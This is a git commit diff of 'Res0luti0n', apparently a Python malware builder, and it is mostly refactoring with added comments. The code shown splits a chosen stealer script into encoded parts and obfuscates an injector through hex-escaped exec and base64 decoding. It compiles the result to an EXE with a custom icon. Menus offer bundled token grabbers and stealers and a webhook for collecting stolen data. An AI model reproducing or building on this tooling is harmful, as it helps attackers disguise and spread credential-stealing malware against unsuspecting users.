5be8598a7ed996055739e93107f083295bb238ea
Adapters <63345758+0xSpoofed@users.noreply.github.com>
2023-06-03 22:12:42 +0200

    Adding arguments

--- Res0luti0n_src/Res0luti0n.py
+++ Res0luti0n_src/Res0luti0n.py
@@ -13,6 +13,7 @@ import string
 import json
 from pypresence import Presence
 
+# Function for the discord rich presence
 def rich_presence():
     try:
         rpc = Presence("1108425762232606790")
@@ -27,34 +28,43 @@ def rich_presence():
     except Exception as e:
         pass
 
+# <---- FILE MANAGEMENT FUNCTIONS ---->
+# Function to read a file 
 def readfile(path):
     with open(path, 'r', encoding='UTF-8') as f:
         data = f.read()
     return data
 
+# Fonction to write a file
 def writefile(path, data):
     with open(path, 'w', encoding='UTF-8') as f:
         f.write(data)
 
+# Function to read a json
 def read_json(file_path: str) -> dict:
     with open(file_path, 'r') as json_file:
         data = json.load(json_file)
     return data
 
+# Function to write a json
 def write_json(file_path: str, data: dict) -> None:
     with open(file_path, 'w') as json_file:
-        json.dump(data, json_file) 
-        
+        json.dump(data, json_file)
+
+# Function to update a json (add a new value)
 def update_json(param, value):
     json_data = read_json(f"{os.getcwd()}\\utilities\\config.json")
     json_data[f"{param}"] = str(value)
     write_json(f"{os.getcwd()}\\utilities\\config.json", json_data)
 
+# Function to get the settings stored in config.json
 def get_settings():
     with open(f"{os.getcwd()}\\utilities\\config.json", 'r') as json_file:
         json_data = json.load(json_file)
     return json_data["name"], json_data["path"], json_data["requirements"], json_data["webhook"], json_data["exe_yn"], json_data["exe_comp"], json_data["icon"]
 
+# <---- ALL WEBHOOKS FUNCTIONS ---->
+# Function to check a webhook (return: Valid or invalid)
 def webhook_checker(webhook_link):
     try:
         resp = requests.get(webhook_link)
@@ -63,13 +73,10 @@ def webhook_checker(webhook_link):
         else:
             return "Valid"
     except Exception as e: 
-        return "Invalid"
-    
-def base64_encoder(data):
-    bytes_text = data.encode('UTF-8')
-    b85_text = base64.b64encode(bytes_text)
-    return b85_text.decode('UTF-8')
+        return "Invalid" 
 
+# <---- PART MANAGEMENT FUNCTIONS ---->
+# Function to hash the malware script to create part
 def script_hasher(script):
     nb_parties = random.randint(5, 10)
     longueur_partie = len(script) // nb_parties
@@ -77,6 +84,13 @@ def script_hasher(script):
     parties.append(script[(nb_parties - 1) * longueur_partie:])
     return parties
 
+# Function to encode a part in base64
+def base64_encoder(data):
+    bytes_text = data.encode('UTF-8')
+    b85_text = base64.b64encode(bytes_text)
+    return b85_text.decode('UTF-8')
+
+# Function to encode a part with Caesar method (return final encoded parts)
 def part_encoder(part, alpha):
     key = ''.join(random.sample(alpha, 2))
     gap = sum(ord(c) for c in key) % 26
@@ -92,7 +106,11 @@ def part_encoder(part, alpha):
         text_int += c_int
     return base64_encoder(text_int + key)
 
+
+# <---- INJECTOR COMPILATION FUNCTIONS ---->
+# Function to obfuscate the injector code 
 def obfuscate(content):
+    # choice of random letters for obfuscation
     ltr = ''.join(random.choices(string.ascii_uppercase, k=4))
     OFFSET = 10
     VARIABLE_NAME = f'__{ltr}_{ltr}' * 100
@@ -111,146 +129,7 @@ def obfuscate(content):
     code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VARIABLE_NAME}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
     return code
 
-def choice_rat(banner, w, m):
-    while True:
-        os.system("cls")
-        print(f"{banner}\n -----\n")
-        print(f" {m}[{w}+{m}]{w} Malware choice:\n")
-        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}4{m}]{w} Select your own py malware")
-        print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber (by Astraadev)    | {m}[{w}5{m}]{w} Back to home")
-        print(f" {m}[{w}3{m}]{w} Creal-Stealer (by Ayhuuu)               |")
-        choice_rat = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
-        
-        if choice_rat == "1":
-            os.system("cls")
-            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "Cooked-grabber.py" ))
-            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "requirements.txt" ))
-            os.system("cls")
-            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: Cooked Grabber !")
-            time.sleep(3)
-        
-        elif choice_rat == "2":
-            os.system("cls")
-            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "Token-grabber.py" ))
-            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "requirements.txt" ))
-            os.system("cls")
-            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Token grabber by Astraadev !")
-            time.sleep(3)
-        
-        elif choice_rat == "3":
-            os.system("cls")
-            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "Creal.py" ))
-            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "requirements.txt" ))
-            os.system("cls")
-            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Creal-Stealer by Ayhuuu !")
-            time.sleep(3)
-        
-        elif choice_rat == "4":
-            os.system("cls")
-            input(f"{banner}\n\n {m}[{w}!{m}]{w} Warning: If you select your own malware you must enter your webhook manually !\n ----\n {m}[{w}+{m}]{w} Press enter to continue...")
-            os.system("cls")
-            path = input(f"{banner}\n\n {w}[{m}+{w}] Enter your malware path here: ")
-            req = input(f" -----\n {w}[{m}+{w}] Enter your malware requirements here: ")
-            update_json("path", path)
-            update_json("requirements", req )
-            os.system("cls")
-            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: {os.path.basename(path)} !")
-            time.sleep(3)
-        
-        elif choice_rat == "5":
-            settings_menu(banner, w, m)
-
-def exe_settings(banner, w, m):
-    while True:
-        exe_yn, exe_comp = get_settings()[4:6]
-        os.system("cls")
-        print(f"{banner}\n -----\n")
-        print(f" {m}[{w}+{m}]{w} EXE Choice:\n")
-        print(f" {m}[{w}1{m}]{w} On/Off               | {m}[{w}3{m}]{w} Change exe logo")
-        print(f" {m}[{w}2{m}]{w} Change compiler      | {m}[{w}4{m}]{w} Back to home")
-
-        choice_exe = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
-
-        if choice_exe == "1":
-            os.system("cls")
-            res = input(f"{banner}\n\n {m}[{w}+{m}]{w} {'Dea' if exe_yn == 'y' else 'A'}ctivate EXE compilation ? (y/n): ")
-            if res == "y":
-                update_json("exe_yn", "n" if exe_yn == 'y' else 'y')
-                os.system("cls")
-                print(f"{banner}\n\n {m}[{w}+{m}]{w} Your malware will {'no longer be' if exe_yn == 'y' else 'be'} converted to exe!")
-                time.sleep(3)
-
-        elif choice_exe == "2":
-            os.system("cls")
-            print(f"{banner}\n -----\n")
-            print(f" {m}[{w}+{m}]{w} Compiler choice:\n")
-            print(f" {m}[{w}1{m}]{w} Cx Freeze {'(current)' if exe_comp == 'Cx_freeze' else ''}")
-            print(f" {m}[{w}2{m}]{w} Pyinstaller {'(current)' if exe_comp == 'Pyinstaller' else ''}")
-            print(f" -----\n {m}[{w}3{m}]{w} Back to home")
-
-            choice_compiler = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
-
-            if choice_compiler in ["1", "2"]:
-                compiler = "Cx_freeze" if choice_compiler == "1" else "Pyinstaller"
-                update_json("exe_comp", compiler)
-                os.system("cls")
-                print(f"{banner}\n\n {m}[{w}+{m}]{w} The {compiler} compiler has been successfully selected!")
-                time.sleep(3)
-
-        elif choice_exe == "3":
-                os.system("cls")
-                logo_path = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your exe logo here (.ico): ")
-                if logo_path[-3:] != "ico":
-                    os.system("cls")
-                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Please enter a correct icon (.ico)! ")
-                    time.sleep(3)
-                else:
-                    update_json("icon", logo_path)
-                    os.system("cls")
-                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Your logo has been successfully selected !")
-                    time.sleep(3)
-        
-        elif choice_exe == "4":
-            settings_menu(banner, w, m)
-
-def settings_menu(banner, w, m):
-    while True:
-        os.system("cls")
-        print(f"{banner}\n -----\n")
-        print(f" {m}[{w}+{m}]{w} Malware setup:\n")
-        print(f" {m}[{w}1{m}]{w} Select your malware    | {m}[{w}4{m}]{w} EXE settings")
-        print(f" {m}[{w}2{m}]{w} Change malware name    | {m}[{w}5{m}]{w} Back to home")
-        print(f" {m}[{w}3{m}]{w} Change malware webhook")
-        choice_settings = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
-        
-        if choice_settings == "1": 
-            choice_rat(banner, w, m)
-            
-        elif choice_settings == "2": 
-            os.system("cls")
-            name = input(f"{banner}\n\n {w}[{m}+{w}] Enter malware name here: ")
-            update_json("name", name)
-            os.system("cls")
-            print(f"{banner}\n\n {m}[{w}+{m}]{w} Malware name updated succesfully as ({name}) !")
-            time.sleep(3)
-            
-        elif choice_settings == "3": 
-            os.system("cls")
-            webhook = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your webhook here: ")
-            update_json("webhook", webhook)
-            os.system("cls")
-            if webhook_checker(webhook) == "Invalid":
-                print(f"{banner}\n\n {m}[{w}!{m}]{w} The webhook you entered seems to be wrong..")
-                time.sleep(3)
-            else: print(f"{banner}\n\n {m}[{w}+{m}]{w} Malware webhook updated succesfully !"), time.sleep(3)
-            
-        elif choice_settings == "4":
-            exe_settings(banner, w, m)
-            
-        elif choice_settings == "5": 
-            os.system("cls")
-            main()
-                        
+#function to build the injector 
 def builder(banner, m, w):
     name, path_, requirements, webhook, exe_yn, exe_comp, icon = get_settings()
     
@@ -318,10 +197,156 @@ def builder(banner, m, w):
         main()
     
     except Exception as e:
-        input(e)
         os.system("cls")
+        print(e) #print error 
         input(f"{banner}\n\n {w}[{m}!{w}] An error occurred while building the malware!")
         
+# <---- GUI PARTS FUNCTIONS ---->
+# Function to show the settings menu
+def settings_menu(banner, w, m):
+    while True:
+        os.system("cls")
+        print(f"{banner}\n -----\n")
+        print(f" {m}[{w}+{m}]{w} Malware setup:\n")
+        print(f" {m}[{w}1{m}]{w} Select your malware    | {m}[{w}4{m}]{w} EXE settings")
+        print(f" {m}[{w}2{m}]{w} Change malware name    | {m}[{w}5{m}]{w} Back to home")
+        print(f" {m}[{w}3{m}]{w} Change malware webhook")
+        choice_settings = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+        
+        if choice_settings == "1": # change the malware
+            choice_rat(banner, w, m)
+            
+        elif choice_settings == "2": # change the malware name
+            os.system("cls")
+            name = input(f"{banner}\n\n {w}[{m}+{w}] Enter malware name here: ")
+            update_json("name", name)
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} Malware name updated succesfully as ({name}) !")
+            time.sleep(3)
+            
+        elif choice_settings == "3": # change the webhook
+            os.system("cls")
+            webhook = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your webhook here: ")
+            update_json("webhook", webhook)
+            os.system("cls")
+            if webhook_checker(webhook) == "Invalid":
+                print(f"{banner}\n\n {m}[{w}!{m}]{w} The webhook you entered seems to be wrong..")
+                time.sleep(3)
+            else: print(f"{banner}\n\n {m}[{w}+{m}]{w} Malware webhook updated succesfully !"), time.sleep(3)
+            
+        elif choice_settings == "4": # acces to the executable settings
+            exe_settings(banner, w, m)
+            
+        elif choice_settings == "5": # exit to previous menu
+            os.system("cls")
+            main()
+            
+# Function to show executable settings 
+def exe_settings(banner, w, m):
+    while True:
+        exe_yn, exe_comp = get_settings()[4:6]
+        os.system("cls")
+        print(f"{banner}\n -----\n")
+        print(f" {m}[{w}+{m}]{w} EXE Choice:\n")
+        print(f" {m}[{w}1{m}]{w} On/Off               | {m}[{w}3{m}]{w} Change exe logo")
+        print(f" {m}[{w}2{m}]{w} Change compiler      | {m}[{w}4{m}]{w} Back to home")
+
+        choice_exe = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+
+        if choice_exe == "1": # Exe obfuscation activation
+            os.system("cls")
+            res = input(f"{banner}\n\n {m}[{w}+{m}]{w} {'Dea' if exe_yn == 'y' else 'A'}ctivate EXE compilation ? (y/n): ")
+            if res == "y":
+                update_json("exe_yn", "n" if exe_yn == 'y' else 'y')
+                os.system("cls")
+                print(f"{banner}\n\n {m}[{w}+{m}]{w} Your malware will {'no longer be' if exe_yn == 'y' else 'be'} converted to exe!")
+                time.sleep(3)
+
+        elif choice_exe == "2": # Compiler choice
+            os.system("cls")
+            print(f"{banner}\n -----\n")
+            print(f" {m}[{w}+{m}]{w} Compiler choice:\n")
+            print(f" {m}[{w}1{m}]{w} Cx Freeze {'(current)' if exe_comp == 'Cx_freeze' else ''}")
+            print(f" {m}[{w}2{m}]{w} Pyinstaller {'(current)' if exe_comp == 'Pyinstaller' else ''}")
+            print(f" -----\n {m}[{w}3{m}]{w} Back to home")
+
+            choice_compiler = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+
+            if choice_compiler in ["1", "2"]: 
+                compiler = "Cx_freeze" if choice_compiler == "1" else "Pyinstaller"
+                update_json("exe_comp", compiler)
+                os.system("cls")
+                print(f"{banner}\n\n {m}[{w}+{m}]{w} The {compiler} compiler has been successfully selected!")
+                time.sleep(3)
+
+        elif choice_exe == "3": # Logo changer
+                os.system("cls")
+                logo_path = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your exe logo here (.ico): ")
+                if logo_path[-3:] != "ico":
+                    os.system("cls")
+                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Please enter a correct icon (.ico)! ")
+                    time.sleep(3)
+                else:
+                    update_json("icon", logo_path)
+                    os.system("cls")
+                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Your logo has been successfully selected !")
+                    time.sleep(3)
+        
+        elif choice_exe == "4":
+            settings_menu(banner, w, m)
+
+# Function to change the malware
+def choice_rat(banner, w, m):
+    while True:
+        os.system("cls")
+        print(f"{banner}\n -----\n")
+        print(f" {m}[{w}+{m}]{w} Malware choice:\n")
+        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}4{m}]{w} Select your own py malware")
+        print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber (by Astraadev)    | {m}[{w}5{m}]{w} Back to home")
+        print(f" {m}[{w}3{m}]{w} Creal-Stealer (by Ayhuuu)               |")
+        choice_rat = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
+        
+        if choice_rat == "1": #Cookedgrabber
+            os.system("cls")
+            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "Cooked-grabber.py" ))
+            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "requirements.txt" ))
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: Cooked Grabber !")
+            time.sleep(3)
+        
+        elif choice_rat == "2": # Classic token grabber
+            os.system("cls")
+            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "Token-grabber.py" ))
+            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "requirements.txt" ))
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Token grabber by Astraadev !")
+            time.sleep(3)
+        
+        elif choice_rat == "3": # Creal Stealer
+            os.system("cls")
+            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "Creal.py" ))
+            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "requirements.txt" ))
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Creal-Stealer by Ayhuuu !")
+            time.sleep(3)
+        
+        elif choice_rat == "4": # Personnal choice
+            os.system("cls")
+            input(f"{banner}\n\n {m}[{w}!{m}]{w} Warning: If you select your own malware you must enter your webhook manually !\n ----\n {m}[{w}+{m}]{w} Press enter to continue...")
+            os.system("cls")
+            path = input(f"{banner}\n\n {w}[{m}+{w}] Enter your malware path here: ")
+            req = input(f" -----\n {w}[{m}+{w}] Enter your malware requirements here: ")
+            update_json("path", path)
+            update_json("requirements", req )
+            os.system("cls")
+            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: {os.path.basename(path)} !")
+            time.sleep(3)
+        
+        elif choice_rat == "5": # Back to menu 
+            settings_menu(banner, w, m)
+
+
+# <---- MAIN FUNCTION WITH GUI INCLUDED ---->
 def main():
     m = colorama.Fore.LIGHTMAGENTA_EX
     w = colorama.Fore.LIGHTWHITE_EX
@@ -340,9 +365,9 @@ def main():
     
     webhook_info = webhook_checker(webhook)
     choices = {
-        "1": lambda: builder(banner, m, w),
-        "2": lambda: settings_menu(banner, w, m),
-        "3": lambda: exit()
+        "1": lambda: builder(banner, m, w), # launch the malware build
+        "2": lambda: settings_menu(banner, w, m), # access to the setting menu 
+        "3": lambda: exit() # exit builder
     }
 
     while True:
@@ -364,7 +389,7 @@ def main():
             os.system("cls")
             continue
     
-    
+# Start main & rich presence  
 if __name__ == '__main__':
     os.system(f"title Resolution builder")
     rich_presence()
